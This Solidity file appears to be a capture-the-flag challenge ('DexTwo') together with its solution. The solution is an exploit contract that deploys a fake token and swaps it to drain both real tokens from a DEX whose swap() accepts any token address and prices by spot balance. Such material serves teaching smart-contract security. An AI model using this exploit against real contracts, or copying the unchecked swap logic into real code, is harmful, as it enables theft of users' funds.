// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

// add your exploiter contract here
contract ExploitContract {
    /**
     * since there are no restrictions on `from` and `to` in `swap()` we can just deploy
     * a random ERC20 contract, mint amount to us and use that to drain the dex.
     * Also, dex relies on `balanceOf()` which can easily be manipulated in this case
     */
    function exploit(SwappableTokenTwo token1, SwappableTokenTwo token2, DexTwo dex) public {
        // deploy a new instance of SwappableTokenTwo and mint large supply
        SwappableTokenTwo someToken = new SwappableTokenTwo(address(dex), "someToken", "ST", type(uint).max);
        someToken.approve(address(this), address(dex), type(uint).max);

        // transfer someTokens to dex
        someToken.transfer(address(dex), 100);

        // swap someToken with token1. price is 1 at this moment
        // this will update someToken balance of dex = 200
        dex.swap(address(someToken), address(token1), 100);

        // swap someToken with token2. price is 100 / 200 = 0.5
        dex.swap(address(someToken), address(token2), 200);
    }
}